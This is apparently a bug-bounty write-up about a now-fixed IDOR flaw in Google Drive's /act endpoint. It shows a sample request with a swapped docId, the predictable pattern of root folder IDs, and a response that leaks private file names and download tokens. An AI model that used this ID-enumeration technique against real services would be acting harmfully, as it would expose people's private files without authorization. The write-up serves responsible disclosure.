---
title: "Google VRP Writeup: Insecure Direct Object Reference (IDOR) in Google Drive File Sharing"
date: 2015-07-07T00:21:44+00:00
url: "/google-drive-information-leak/"
draft: false
description: "A vulnerability research writeup of an IDOR vulnerability discovered in Google Drive (Google VRP Bounty $3,133.70) that allowed unauthorized listing and leaking of private user files and Gmail attachments."
categories: ["Web Security", "Bug Bounty", "Vulnerability Research"]
tags: ["idor", "google-vrp", "bug-bounty", "api-security", "information-disclosure"]
---

In April 2015, I reported an Insecure Direct Object Reference (**IDOR**) vulnerability to the Google Vulnerability Reward Program (Google VRP) affecting Google Drive and Gmail attachments. 

The flaw allowed an attacker to query document metadata, filenames, user account names, and direct download authorization hashes for arbitrary Google Drive accounts by manipulating internal directory object identifiers (`docId`).

Google resolved the issue and awarded a **\$3,133.70** bounty.

---

### Background: Google Drive Sharing Flow

When users share files in Google Drive or attach photos/documents via Gmail, Google generates a resource token (a unique file hash) and associates it with the user's root folder collection (`docId`).

During testing of the Google Drive Web UI, I intercepted internal state synchronization calls transmitted to the `/act` endpoint.

---

### The Vulnerability: IDOR on `/act`

When requesting directory updates, the Google Drive web interface dispatches a `POST` request containing a parameter named `docId`:

```http
POST /act HTTP/1.1
Host: drive.google.com
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-Json-Requested: true
Cookie: [Authenticated User Session Cookies]

docId=0ALWQPi6NE9vbUk9PVA&recursive=true&minResultCount=20&token=[CSRF_TOKEN]&authuser=0
```

#### The Root Cause:
The server-side backend verified that the caller had a valid authenticated session, but **failed to verify whether the requesting account possessed authorization to view the target `docId` collection**.

Furthermore, root collection identifiers followed a predictable pattern:
- Started with `0A`
- Ended with fixed padding: `Uk9PVA`
- Low-entropy middle string (easily enumerated or discovered through shared link leaks).

---

### Information Disclosure Response

By substituting the `docId` parameter with another user's root directory ID, the API returned a full JSON representation of the victim's files, shared photos, and Gmail attachments:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

)]}'
{
  "response": {
    "responseProto": "[[[10,[10,17]\n,[[,\"Target User Display Name\",,\"/c/u/0/photos/public/AIbEiAIAAAB...\",,\"07075400765864628005\"]\n]\n,[[\"0B7WXP883E9vbX1CBZWtaemtPNXM\",\"financial_records.pdf\",\"application/pdf\"]\n]\n,,,,,,,,,,[,,,,1]\n,,0]\n]\n,,59807321897]\n"
  }
}
```

The response leaked:
1. Target account display name and profile image URLs.
2. Complete file names and MIME types.
3. The cryptographic file token: `0B7WXP883E9vbX1CBZWtaemtPNXM`.

With the direct token exposed, the attacker could download the private document directly:
`https://drive.google.com/file/d/0B7WXP883E9vbX1CBZWtaemtPNXM/`

---

### Disclosure Timeline

- **April 22, 2015:** Vulnerability reported to Google Security Team.
- **April 23, 2015:** Report triaged and accepted by Google security engineers.
- **April 30, 2015:** Backend authorization fix deployed across Google infrastructure.
- **May 7, 2015:** `docId` entropy enhanced; **\$3,133.70** bounty awarded.
